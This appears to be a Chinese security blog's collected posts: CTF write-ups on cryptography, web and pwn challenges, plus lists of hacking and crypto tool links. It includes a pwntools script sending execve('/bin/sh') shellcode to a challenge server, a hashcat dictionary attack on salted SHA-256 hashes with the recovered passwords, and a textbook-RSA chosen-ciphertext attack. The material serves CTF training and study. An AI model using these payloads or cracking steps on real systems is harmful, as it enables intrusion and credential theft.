cmp(int a, int b)&#123; return st[a]&lt;st[b];&#125;int main()&#123; ios::sync_with_stdio(0); //加速输入输出用，其实为了效率应该考虑用scanf/printf + char*的组合，不过也能接受了 freopen("rawsha256.txt", "r", stdin); string a; int pos=0; while(cin&gt;&gt;a)&#123; st.push_back(a); arr[pos]=pos; ++pos; &#125; sort(arr,arr+14344391,cmp); cout&lt;&lt;arr[0]&lt;&lt;endl&lt;&lt;arr[14344390]&lt;&lt;endl; return 0;&#125;//2637658//9682632//--------------------------------//Process exited after 67.14 seconds with return value 0 然后找到对应单词测试一下就行 12345678&gt;&gt;&gt; import hashlib&gt;&gt;&gt; def hash(strings):... return str(hashlib.sha256(strings.encode()).hexdigest())...&gt;&gt;&gt; print(hash("yame1bore"))0000010e433cfc497373957df2ea9af41ec17edc43672c413558f62d09842190&gt;&gt;&gt; print(hash("bert7quinn,3"))fffffdaa4034dadd8b4cf8a18f92a230a92423ee24ad6dfb24adb758a8487ca2 Vigenère多表，工具即可 https://f00l.de/hacking/vigenere.php 成功 You already solved this one! Solution: BARLEY Monoalphabetic Cipher单表，工具解决 https://quipqiup.com/ 成功 You already solved this one! Solution: c21c7f2384dabd723c6d265b1315ddb5 Salt Alone Won’t Save You暴力？字典暴力？ 是字典 先去hashcat了解了形式以后，写个脚本读 12345678910import base64, binasciif = open("crack.txt", "r")s = f.readlines()f.close()f = open("crack.txt", "w")for ss in s: ss = ss.split("$")[1:] ss[1] = ss[1][:-1] f.write(binascii.hexlify(base64.b64decode(ss[1])).decode('ascii')+':'+ss[0]+'\n')f.close() 然后上hashcat 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889A:\Downloads\Compressed\hashcat-4.1.0λ hashcat64.exe -m 1410 crack.txt rockyou.txthashcat (v4.1.0) starting...* Device #1: WARNING! Kernel exec timeout is not disabled. This may cause "CL_OUT_OF_RESOURCES" or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch* Device #2: Intel's OpenCL runtime (GPU only) is currently broken. We are waiting for updated OpenCL drivers from Intel. You can use --force to override, but do not report related errors.nvmlDeviceGetFanSpeed(): Not SupportedOpenCL Platform #1: NVIDIA Corporation======================================* Device #1: GeForce GTX 965M, 512/2048 MB allocatable, 8MCUOpenCL Platform #2: Intel(R) Corporation========================================* Device #2: Intel(R) HD Graphics 530, skipped.* Device #3: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped.Hashes: 7 digests; 7 unique digests, 7 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Applicable optimizers:* Zero-Byte* Early-Skip* Not-Iterated* Raw-HashMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Minimim salt length supported by kernel: 0Maximum salt length supported by kernel: 256ATTENTION! Pure (unoptimized) OpenCL kernels selected.This enables cracking passwords and salts &gt; length 32 but for the price of drastically reduced performance.If you want to switch to optimized OpenCL kernels, append -O to your commandline.Watchdog: Temperature abort trigger set to 90cDictionary cache built:* Filename..: rockyou.txt* Passwords.: 14344390* Bytes.....: 139921496* Keyspace..: 14344383* Runtime...: 1 sec0603ae874b416862ad705b1c42f770141b1c802fa960a5b5aa91430f04c94400:kPD)T)=~1K&#123;r:totoloco19906f2da1836ac6d7c40a93da4ca9afc56fdbe7279fcd12f479aa983d495772de73:4.9.mHSbiQ]^:phuck12397ddc547c46af1af9821475c0b629d6a47bbfeb952535cc0afff72022459548d:b*.m,%~&amp;&lt;"^6:nc27360e91ba9f0ff28267c4af7c6976bc1e119138b76fc2cf719a06b097baec8761391:(y3]&lt;+9zmi4|:imberly1999573fa001661fffc3c82aeec82f16951670dc342cc071eadc8bc71a8826209b66:&#123;4[1m"WqdR0s:cowmen7Cracking performance lower than expected?* Append -O to the commandline. This lowers the maximum supported password- and salt-length (typically down to 32).* Append -w 3 to the commandline. This can cause your screen to lag.* Update your OpenCL runtime / driver the right way: https://hashcat.net/faq/wrongdriver* Create more work items to make use of your parallelization power: https://hashcat.net/faq/moreworkApproaching final keyspace - workload adjusted.Session..........: hashcatStatus...........: ExhaustedHash.Type........: sha256($pass.$salt)Hash.Target......: crack.txtTime.Started.....: Fri May 11 15:37:43 2018 (5 secs)Time.Estimated...: Fri May 11 15:37:48 2018 (0 secs)Guess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.Dev.#1.....: 11989.9 kH/s (9.69ms) @ Accel:128 Loops:1 Thr:384 Vec:1Recovered........: 5/7 (71.43%) Digests, 5/7 (71.43%) SaltsProgress.........: 100410681/100410681 (100.00%)Rejected.........: 0/100410681 (0.00%)Restore.Point....: 14344383/14344383 (100.00%)Candidates.#1....: $HEX[3032313342] -&gt; $HEX[042a0337c2a156616d6f732103]HWMon.Dev.#1.....: Temp: 63c Util: 50% Core:1151MHz Mem:2505MHz Bus:16Started: Fri May 11 15:37:31 2018Stopped: Fri May 11 15:37:48 2018 排序输入得到答案 CCA on Textbook RSARSA的选择密文攻击。 假设爱丽丝创建了密文 $C=P^emodn$并且把 $C$ 发送给鲍勃，同时假设我们要对爱丽丝加密后的任意密文解密，而不是只解密 $C$，那么我们可以拦截$ C$，并运用下列步骤求出 $P$： 选择任意的 $X∈Z^∗_n$，即 $X$ 与 $N$ 互素 计算 $Y=C×X^emod n$ 由于我们可以进行选择密文攻击，那么我们求得 $Y$ 对应的解密结果 $Z=Y^d$ 那么，由于 $Z=Y^d=(C×X^e)^d=C^dX=P^{ed}X=PXmodn$，由于 $X$ 与 $N$ 互素，我们很容易求得相应的逆元，进而可以得到 $P$ 于是先读公钥 123456789101112131415161718192021222324252627282930313233λ openssl rsa -pubin -in pubkey.pem -text -modulusPublic-Key: (2048 bit)Modulus: 00:a9:a9:60:8d:4b:d1:be:ee:e3:ce:11:51:cc:2d: 1a:72:b8:76:df:63:e4:9f:70:aa:c8:da:e5:04:f5: 91:7c:aa:f7:9f:5a:16:ae:5a:0b:8f:c2:e5:59:b6: 46:8f:b4:9b:64:8d:02:96:6e:a2:30:03:f2:08:d7: 56:b6:31:11:2d:86:ae:85:5e:04:82:e7:df:db:d5: e9:0d:06:d5:6b:58:12:36:db:9a:9b:d5:24:2f:2e: ca:82:b5:c2:f9:52:88:50:ad:be:78:b7:d1:83:e2: b1:ee:3b:2e:89:f2:45:33:9e:88:04:67:40:a0:d0: 50:49:f5:76:a3:7a:ca:a9:45:0c:51:c7:7c:f5:b5: ba:85:e5:72:39:c2:a0:55:8e:eb:a1:f0:e6:06:7a: d3:b9:c6:50:08:7b:6b:35:ea:72:eb:8a:c6:8c:00: 5d:4a:38:a4:c7:d8:d4:0c:b2:91:59:4a:83:21:ff: 6c:08:78:81:2a:65:9a:83:59:f7:67:65:cd:55:97: 15:96:ec:20:1a:30:63:8f:39:c5:23:08:5e:13:c7: 55:9d:07:22:44:ea:70:df:84:f3:7b:a8:13:19:51: 76:fc:62:c7:58:63:78:38:3f:5a:52:93:b0:3f:54: 43:26:5d:f8:e7:50:5f:27:9f:e5:60:6d:36:bc:f1: 47:f9Exponent: 65537 (0x10001)Modulus=A9A9608D4BD1BEEEE3CE1151CC2D1A72B876DF63E49F70AAC8DAE504F5917CAAF79F5A16AE5A0B8FC2E559B6468FB49B648D02966EA23003F208D756B631112D86AE855E0482E7DFDBD5E90D06D56B581236DB9A9BD5242F2ECA82B5C2F9528850ADBE78B7D183E2B1EE3B2E89F245339E88046740A0D05049F576A37ACAA9450C51C77CF5B5BA85E57239C2A0558EEBA1F0E6067AD3B9C650087B6B35EA72EB8AC68C005D4A38A4C7D8D40CB291594A8321FF6C0878812A659A8359F76765CD55971596EC201A30638F39C523085E13C7559D072244EA70DF84F37BA813195176FC62C7586378383F5A5293B03F5443265DF8E7505F279FE5606D36BCF147F9writing RSA key-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqalgjUvRvu7jzhFRzC0acrh232Pkn3CqyNrlBPWRfKr3n1oWrloLj8LlWbZGj7SbZI0Clm6iMAPyCNdWtjERLYauhV4Eguff29XpDQbVa1gSNtuam9UkLy7KgrXC+VKIUK2+eLfRg+Kx7jsuifJFM56IBGdAoNBQSfV2o3rKqUUMUcd89bW6heVyOcKgVY7rofDmBnrTucZQCHtrNepy64rGjABdSjikx9jUDLKRWUqDIf9sCHiBKmWag1n3Z2XNVZcVluwgGjBjjznFIwheE8dVnQciROpw34Tze6gTGVF2/GLHWGN4OD9aUpOwP1RDJl3451BfJ5/lYG02vPFH+QIDAQAB-----END PUBLIC KEY----- 123456789λ pythonPython 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; n =0xA9A9608D4BD1BEEEE3CE1151CC2D1A72B876DF63E49F70AAC8DAE504F5917CAAF79F5A16AE5A0B8FC2E559B6468FB49B648D02966EA23003F208D756B631112D86AE855E0482E7DFDBD5E90D06D56B581236DB9A9BD5242F2ECA82B5C2F9528850ADBE78B7D183E2B1EE3B2E89F245339E88046740A0D05049F576A37ACAA9450C51C77CF5B5BA85E57239C2A0558EEBA1F0E6067AD3B9C650087B6B35EA72EB8AC68C005D4A38A4C7D8D40CB291594A8321FF6C0878812A659A8359F76765CD55971596EC201A30638F39C523085E13C7559D072244EA70DF84F37BA813195176FC62C7586378383F5A5293B03F5443265DF8E7505F279FE5606D36BCF147F9&gt;&gt;&gt; x = 3&gt;&gt;&gt; c = 0x912fcd40a901aa4b7b60ec37ce6231bb87783b0bf36f824e51fe77e9580ce1adb5cf894410ff87684969795525a63e069ee962182f3ff876904193e5eb2f34b20cfa37ec7ae0e9391bec3e5aa657246bd80276c373798885e5a986649d27b9e04f1adf8e6218f3c805c341cb38092ab771677221f40b72b19c75ad312b6b95eafe2b2a30efe49eb0a5b19a75d0b31849535b717c41748a6edd921142cfa7efe692c9a776bb4ece811afbd5a1bbd82251b76e76088d91ed78bf328c6b608bbfd8cf1bdf388d4dfa4d4e034a54677a16e16521f7d0213a3500e91d6ad4ac294c7a01995e1128a5ac68bfc26304e13c60a6622c1bb6b54b57c8dcfa7651b81576fc&gt;&gt;&gt; d = pow(x,0x10001,n)*c%n&gt;&gt;&gt; hex(d)'0x5eff6db089a86b058bbfd34f01cbe256fc9cc5b18c0999bd215048f8ca3de6f3250191417e502ea15aac5c7cf167c9be60944361163b13b96b1262dfc4bcbd695a61dcedd74192d9bfc5c0b9c8399cba3f6e6fc9f4adaf6d65b0594c696a32ab53913c06be6de9ee68b030b0aaef65bec0cbec7ad2439057cf30f7cd083138f98be11e93e54168acbc4bacb6b87b0a4a3d84e761f58e7605a0ae01b72c1344e96d7c5401be91bbe78a3527672c073c4c355ee340a1d2ea5d178c31c40561bccfb9ef47e0c984bd8227a187f492489b0292b506edf992950c009b59d2093b43f5601affa6b5b0b39a4b848c654ad242c55e62b358c03d91f889e7ab5e5d7e7f02' 提到网站去，得到1395d5d50ae8d8e24572a393c628b3c4b335a30298b305d396e8b2a388e302d602a245d3c4e4a8e335990a88e5a302a5a30478de8244b36305690938b512d32 求$3^{-1}modn$，最后计算得到明文0x687474703a2f2f6172636869762e696e667365632e6574687a2e63682f656475636174696f6e2f667330382f73656373656d2f4d616e67657230312e706466 AES-CTR with Nonce Reuse就是Two-Time-Pad攻击咯 Bad Entropy就是爆破咯 123456789101112131415161718192021from hashlib import md5from Crypto.Cipher import AESimport binasciic = binascii.unhexlify("a99210d796a1e37503febf65c329c1b2")print(c)i = 1453651200while i &lt;= 1454169600: s = md5(str(i).encode()).hexdigest() s = binascii.unhexlify(s) cipher = AES.new(s, AES.MODE_ECB) try: cipher.decrypt(c).decode('ascii') print(cipher.decrypt(c)) a = input() if int(a) == 0: print(i) break except: pass i += 1 爆破成功，密钥时间是1453862488 Rainbow Table Hash Chain直觉告诉我hashcat可解 Elliptic Curve Private Key Recovery貌似是公钥选得腊鸡？但是我需要复（yu）习一下ECC ECDSA Nonce Recovery同上 Double Strength Affine直觉告诉我，暴力依然可以解 Slightly harder passwordsTwitter上有hint，直觉告诉我说hashcat可以解决 Upgraded Affine这个的CBC需要考虑一下子了 Fvtavat Xrl Erpbirel印象里是RSA，慢慢来把 Insufficient Key Size这题这么水还放这么后面……yafu/factordb秒解好吧 都懒得写WP了……看到这里还不会的可以退群了（明示【误 Håstad’s Broadcast AttackRSA广播攻击诶，好嗦 CBC Padding Attack标题明示，我要慢慢学习去 Breaking PDF PasswordsVigenère + Rail Fence手动一个个试，然后得到密钥是21，trader Recover the secret phone number这题还是比较有意思的 首先很明显是一个base64 12345678λ pythonPython 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; a = "H4sIAIq6o1cAAy2QS5OiMBSF9/yaIDrVLnrRQfJS000gAbILhCJAUMryMfrrB6tndRf3u+ecexR2nuLQNxF3eiU7u0IvitWtitimIcLrGEamFGdKxNmUx64hqq+xHyi++jZbd3JSQx1p3/QQBAbLBWCznRDQGbzocuws/ug0VkNz8g8br/fxKO51b8Ei+GwzCOon7JuTevNTHbFhmcBg/woo3t704qCWhM0kT80TurqHvir5rEv6TrpZmNDG7wP1fLNFsQ0p5m9uMsVmpNiDQ3feB4cMXA9ZGAtpWd7DVEl2zOSxy4DSvzuwz6WLLBCikPOhDmdmiB7yEQkhWSwlSqrSwsUUBtnkYF4yYxJdfOPHJc2VaPF2rkox1IPjlVep9VAJoJzuZtJOi8aKsQa7hEdfF0H4VO/4TxbZW6B2ycbsPMyIpy2+Si7/mpzwtUX6zndfoRmT1/4FYROKix05q4mjQvE/sbdeK9cLUN3b0X3LhIWBJLBKw5kuL5CjfDyKUnkl5cYixESCRCrp/n8VKB/TTiIV54nf0eSKit8arnH3+Rn8A9M9NCIXAgAA"&gt;&gt;&gt; import base64&gt;&gt;&gt; f = open("file","wb")&gt;&gt;&gt; f.write(base64.b64decode(a))429 然后去鉴定去 12345root@kali:~# binwalk fileDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 gzip compressed data, from Unix, last modified: 2016-08-04 21:58:34 接着解压 1root@kali:~# gzip -d file 接着又是很明显的base64，解出来是个公钥 去分解一下，成功了 求得私钥解出号码 Optimal Backpack AllocationInsecure PRNGPlayfairCRIMEs against TLSBleichenbacher’s CCA2 on RSABackdoored PRNGNot So Safe PrimesDSA with LCG nonces]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装式工具集合]]></title>
    <url>%2F2018%2F03%2F01%2F%E5%AE%89%E8%A3%85%E5%BC%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[持续更新ing 可能以后还会重新整理 英语工具http://www.1checker.com/Products/DownLoad http://www.gingersoftware.com/zh/download]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Software</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆向工程核心原理学习笔记（一）]]></title>
    <url>%2F2018%2F02%2F26%2F%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[HGAME2018-week2部分WP]]></title>
    <url>%2F2018%2F02%2F16%2FHGAME2018-week2%E9%83%A8%E5%88%86WP%2F</url>
    <content type="text"><![CDATA[菜鸟每天飞过 ，报告一下做题进度- Web - [x] Random? - [x] 草莓社区-1 - [x] 草莓社区-2 - [ ] XSS-1 - [ ] XSS-2 - [ ] 最简单的sql题- Rev - [ ] wtfitis - [ ] miaomiaowu - [ ] iccanobif- PWN - [x] ez_shellcode - [x] ez bash jail - [ ] hacker_system_ver1 - [ ] ez_shellcode_ver2- Misc - [x] 咻咻咻 - [x] White cosmos - [x] easy password - [x] mysterious file header- Crypto - [x] easy rsa - [x] the same simple RSA - [ ] xasr - [x] Caesar&amp;&amp;Caesar - [x] violence所以我到底是啥呢？想了想，应该是Web瞎做，Bin乱搞，其他RP选手……# Web## Random?首先都提示了vim改代码，那就是源码泄露咯试了一下是 用vim读一下 这里的方法是构造一个对象使public和secret公用空间，方法是 草莓社区-1LFI嘛，最简单的肯定是直接来咯 草莓社区-2难一点的就用base64编码读咯 PWNez_shellcode既然是直接执行，那找一个就好了 123456from pwn import *r = remote("111.230.149.72",10004)print r.recvpayload = "\x6a\x0b"+"\x58"+"\x99"+"\x52"+"\x68\x2f\x2f\x73\x68"+"\x68\x2f\x62\x69\x6e"+"\x89\xe3"+"\x52" +"\x53"+"\x89\xe1"+"\xcd\x80"r.send(payload)r.interactive() ez bash jail根据视频教程 Misc咻咻咻首先是一个zip伪加密 解压出来以后按照https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/用Ruby来解码 明显是Base64，解码得flag White cosmosPWNHUB密码学专场里的签到题的套路 打开一看0x09/0x20心里就有底了 因为可见字符首位应该是0，所以0x09对应0，0x20对应1 easy password没什么好说的，跑就是了 mysterious file header首先是zip包把前四字节做了一下调整，还是比较明显的，改正常以后解压就行 解压出来的文件拿反编译器http://www.javadecompilers.com/搞一下 有用的代码为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* * Decompiled with CFR 0_123. */package GUI;import java.awt.Component;import java.awt.GridLayout;import java.awt.LayoutManager;import java.awt.event.ActionEvent;import java.awt.event.ActionListener;import javax.swing.JButton;import javax.swing.JFrame;import javax.swing.JPanel;import javax.swing.JTextArea;public class hgameGUI extends JFrame &#123; private static final int DEFAULT_WIDTH = 300; private static final int DEFAULT_HEIGHT = 200; public hgameGUI() &#123; super("Welcome to Hgame!"); this.setSize(300, 200); JButton flag1 = new JButton("i'm flag"); JButton flag2 = new JButton("i'm flag, too."); JButton flag3 = new JButton("RU kidding me? I'm the true flag!"); JButton flag4 = new JButton("UR wrong, I'm the true flag!"); JTextArea flagtext = new JTextArea("Want flag? Try upstairs."); JPanel flag = new JPanel(); flag.setLayout(new GridLayout(5, 1)); flag.add(flag1); flag.add(flag2); flag.add(flag3); flag.add(flag4); flag.add(flagtext); flag1.addActionListener(event -&gt; &#123; flagtext.setText("118"); &#125; ); flag2.addActionListener(event -&gt; &#123; flagtext.setText("54"); &#125; ); flag3.addActionListener(event -&gt; &#123; flagtext.setText("29"); &#125; ); flag4.addActionListener(event -&gt; &#123; flagtext.setText("89"); &#125; ); this.add(flag); &#125;&#125; 智障的我反应了半天才明白这是IP地址 遍历一下顺序查一下，在中国的一个IP里找到 Cryptoeasy rsa明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ 123456789101112131415161718N = 10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001e = 65537c = 4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891h = 211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750low = 1high = h//2 mid =int((low+high))//2while low&lt;high: if low*(h-low) &gt; N: high = mid-1 else: low = mid + 1 mid = (low+high)//2print(low)print(h-low) 这样就有p/q了 后来发现这出题人一开始应该没这样想 回头补…… The same simple RSA先读一下key咯 12345678910111213$ openssl rsa -pubin -in pubkey.pem -text -modulusPublic-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY-----writing RSA key 256位嘛，好说了 然后用rsatool生成pem文件，解密得flag 需要注意的是有了q/p也不能直接解密，这是使用了openssl的缘故（具体的我还没了解过 Caesar&amp;&amp;Caesar直接在线解咯 要分析的话，就是指数重叠+频率分析？ violence123456a = "191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105"a = a.replace('_','')str = ""for i in range(0,int(len(a)/2)): str+=chr(ord('a')+int(a[2*i]+a[2*i+1],16))print(str) 123456from pycipher import Affines = [1,3,5,7,9,11,15,17,19,21,23,25]for i in s: for j in range(0,25): print(Affine(a=i,b=j).encipher('zxjfghjfzhggdvfzdkhgxmuhxcfqrf').lower()) 然后找到]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
        <tag>PWN</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PWN学习记录]]></title>
    <url>%2F2018%2F02%2F10%2FPWN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[学习PWN的记录 可能会有路线，看填坑进度…… 环境配置按理说第一篇是要说一下这个 我是Kali 2.0，所以就按照如下指令输进去就行了 123456789dpkg --add-architecture i386 apt-get updateapt-get -f dist-upgrade apt-get install lib32c-dev lib32stdc++6 apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialpip install pwntoolsgit clone https://github.com/pwndbg/pwndbg /opt/pwndbgcd /opt/pwndbg./setup.sh 学习记录及WP地址 Exploit-Exercise Nebula Protostar Fusion Main Sequence Main Sequence Story line Setup instructions Irate Manticore Touchy Owl Wild Amphibian Storming Bear Screaming Jesus Fabled Scorpion Selfish Dragonfly Vicious Platypus CTF HGAME2018 week1 guess_number flag_server zazahui week2 ez_shellcode ez bash jail hacker_system_ver1 ez_shellcode_ver2 To be continue…]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[轻工具个人集合]]></title>
    <url>%2F2018%2F02%2F08%2F%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[持续更新ing 可能以后还会重新整理 cpp在线沙盒编译器https://wandbox.org/ cpp生成汇编代码https://godbolt.org/ Web在线写项目https://stackblitz.com/ 数据结构/算法可视化https://visualgo.net/zh http://algo-visualizer.jasonpark.me/#path=backtracking/n_queens/n_queens http://www.cs.usfca.edu/~galles/visualization/Algorithms.html 一个工具集http://tool.yovisun.com/ 学术期刊影响因子及分类分区目录 2014年分区表 2012年分区表 2011年分类目录 材料学院2012年国际一流期刊 SCI-Hub可用网址链接 智能快递查询 在线视频智能解析下载 计量单位换算器 长度计量单位换算器 重量计量单位换算器 WordCounter 英文论文单词统计 HTML/JavaScript格式化及加密压缩工具 BBeJSON 工具 英文单词大小写转换 RGB颜色在线拾取与转换 JSON代码格式化及着色工具 数字转换成大写金额 未来一小时天气精准查询 经纬度查询两点距离 在线分解质因子http://factordb.com OEIS数列查找http://oeis.org/ 时光机器https://web.archive.org/ 书籍、论文下载http://gen.lib.rus.ec/ https://libgen.pw/ http://readfree.me/ http://www.kindle178.com/ http://mebook.cc/?s=%E7%A8%8B%E5%BA%8F http://cn.epubee.com/books/ http://www.books-share.com/ http://en.booksee.org http://booksc.org https://sci-hub.tw/ http://bestcbooks.com/ 软件破解http://astalavista.box.sk/]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>software_development</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF轻工具个人集合]]></title>
    <url>%2F2018%2F02%2F08%2FCTF%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[持续更新ing 可能以后还会重新整理 古典密码学工具在线解密http://www.practicalcryptography.com/ciphers/ 直链列表： Atbash Cipher ROT13 Cipher Caesar Cipher Affine Cipher Rail-fence Cipher Baconian Cipher Polybius Square Cipher Simple Substitution Cipher Codes and Nomenclators Cipher Columnar Transposition Cipher Autokey Cipher Beaufort Cipher Porta Cipher Running Key Cipher Vigenère and Gronsfeld Cipher Homophonic Substitution Cipher Four-Square Cipher Hill Cipher Playfair Cipher ADFGVX Cipher ADFGX Cipher Bifid Cipher Straddle Checkerboard Cipher Trifid Cipher Fractionated Morse Cipher Enigma Cipher Lorenz Cipher 另一个网站： WordCounter 英文论文单词统计 另一个维吉尼亚：https://atomcated.github.io/Vigenere/ 另一个维吉尼亚：http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx 另一个维吉尼亚：https://f00l.de/hacking/vigenere.php 文字加密解密： http://www.qqxiuzi.cn/bianma/wenbenjiami.php 单表替换：https://quipqiup.com/ 库pycipher 数论计算器https://www.alpertron.com.ar/CALTORS.HTM Brainfuckhttp://esoteric.sange.fi/brainfuck/impl/interp/i.html PWN-cheatsheethttps://github.com/Naetw/CTF-pwn-tips PHP代码在线执行http://sandbox.onlinephpfunctions.com/ 在线扫码https://online-barcode-reader.inliteresearch.com/ MD5破解https://somd5.com/ http://www.md5online.org/ HASH破解https://www.onlinehashcrack.com/ https://crackstation.net/ 在线OCRhttp://jinapdf.com/cn/image-to-text-file.php http://ocr.wdku.net/ base家族自动解123456789101112131415161718192021222324252627282930313233343536373839404142# -*- coding: utf-8 -*-# Python3# AutoBase.pyfrom base64 import *s = input()lis1 = [s]lis2 = []lis3 = []lis4 = []while(1): for a in lis1: ok = 0 try: lis2.append(b64decode(a).decode('ascii')) ok = 1 except: pass try: lis2.append(b32decode(a).decode('ascii')) ok = 1 except: pass try: lis2.append(b16decode(a).decode('ascii')) ok = 1 except: pass if not ok: lis3.append(a) if not len(lis2): break lis1=lis2.copy() lis2.clear()for a in range(0,len(lis3)): ok = 1 for b in lis3[a]: if ord(b)&gt;126 or ord(b)&lt;32: ok = 0 break if ok: lis4.append(lis3[a])print(lis4) 漏洞平台http://www.cnnvd.org.cn/ http://www.cnvd.org.cn/ http://exploit-db.com http://www.exploit-id.com/ http://cve.mitre.org/ http://www.securiteam.com/ http://securityvulns.com/ (更新至2015.02.11) http://securityvulns.ru/ http://www.securityfocus.com/ http://marc.info/?l=bugtraq http://www.securitytracker.com/ https://packetstormsecurity.com/ 题目https://ctftime.org/ http://shell-storm.org/repo/ https://www.jarvisoj.com/ http://oj.xctf.org.cn/web/login/?next=/ http://www.shiyanbar.com/ctf/practice http://ctf.nuptsast.com/ https://cgctf.nuptsast.com https://skidophrenia.ctfd.io/ https://www.ichunqiu.com/battalion http://cxsecurity.com/exploit/ http://reversing.kr/ http://pwnable.kr/ http://codeengn.com/challenges/ https://exploit-exercises.com/ https://io.netgarage.org/ http://hackinglab.cn/ http://captf.com/ http://www.baimaoxueyuan.com/ctf http://hkyx.myhack58.com/index.html http://overthewire.org/wargames/krypton/ https://backdoor.sdslabs.co/ http://www.hetianlab.com/CTFrace.html http://security.cs.rpi.edu/courses/binexp-spring2015/ http://www.wechall.net/challs http://smashthestack.org/wargames.html https://microcorruption.com/login https://www.hackthissite.org/pages/index/index.php https://exploit-exercises.com/protostar/ http://ctf.bugku.com/challenges https://id0-rsa.pub/]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HGAME2018-week1WP]]></title>
    <url>%2F2018%2F02%2F08%2FHGAME2018-week1WP%2F</url>
    <content type="text"><![CDATA[第一周难度还是挺温柔，居然让我AK了，好开心呀 对了，这篇是先在本地生成的，周日才传上博客的。 WebAre you from Europe?第一次做这种题，还学到了一点浏览器console的用法……直接看源码，最开始发现在F12的console里输入quartz +=100000000有用然后很开心地抽卡，抽了半天感觉不对，仔细看了下概率……淦哦我是不是傻 翻到最底下有个函数，看着就是和flag有关的样子代码美化一哈 special number源码已经放了出来123456789101112131415include_once("flag.php");if(isset($_GET['key']))&#123; $pattern = '/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/ '; $key = $_GET['key']; if(preg_match($pattern,$key)===0)&#123; echo "格式错误"; &#125;else&#123; $lock="******************"; $b = json_decode($key); if($b==$lock) echo $flag; else echo "this is no special number"; &#125;&#125; 